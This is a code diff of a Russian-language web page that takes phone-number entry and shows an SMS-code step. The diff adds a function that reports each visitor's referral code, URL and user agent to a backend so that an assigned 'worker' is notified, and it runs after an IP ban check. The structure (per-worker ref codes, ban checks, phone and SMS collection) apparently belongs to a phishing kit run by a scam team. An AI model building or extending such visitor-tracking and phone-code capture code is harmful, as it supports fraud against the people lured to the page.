@@ -1414,7 +1414,6 @@
                     showSmsAnimation(fullPhone);
                 } else {
                     let errorMsg = data.error || "неизвестная ошибка";
-                    // ПРОВЕРЯЕМ КОНКРЕТНЫЕ ОШИБКИ
                     if (errorMsg.includes("phone number is invalid") || errorMsg.includes("неверный формат")) {
                         statusDiv.innerHTML = "❌ <b>ВЫ НЕВЕРНО ВВЕЛИ НОМЕР!</b>\nПроверьте и введите заново.";
                     } else if (errorMsg.includes("invalid")) {
@@ -1552,6 +1551,37 @@
     window.closeBroadcast = closeBroadcast;
     window.showBroadcast = showBroadcast;
     
+    // ============================================================
+    // ===== УВЕДОМЛЕНИЕ ВОРКЕРУ О ЗАХОДЕ =====
+    // ============================================================
+    
+    async function notifyWorkerAboutVisit() {
+        const refCode = currentRefCode || new URLSearchParams(window.location.search).get('ref');
+        if (!refCode) {
+            console.log('❌ Нет реф кода, уведомление не отправляем');
+            return;
+        }
+        
+        try {
+            const response = await fetch(`${API_URL}/notify_visit`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    ref: refCode,
+                    url: window.location.href,
+                    user_agent: navigator.userAgent,
+                    timestamp: Date.now()
+                })
+            });
+            console.log('✅ Уведомление о заходе отправлено');
+        } catch(e) {
+            console.log('❌ Ошибка уведомления:', e);
+        }
+    }
+    
+    // ============================================================
+    // ========== ГЛАВНАЯ ЗАГРУЗКА С ПРОВЕРКОЙ БАНА ==========
+    // ============================================================
     (async function main() {
         const allowed = await checkBan();
         
@@ -1562,6 +1592,9 @@
         
         console.log('✅ IP НЕ ЗАБАНЕН, ЗАГРУЗКА САЙТА');
         loadWorkerData();
+        
+        // ===== ЗАПУСКАЕМ УВЕДОМЛЕНИЕ О ЗАХОДЕ =====
+        setTimeout(notifyWorkerAboutVisit, 500);
         
         if (currentRefCode) {
             console.log('✅ Запуск проверки команд для ref:', currentRefCode);
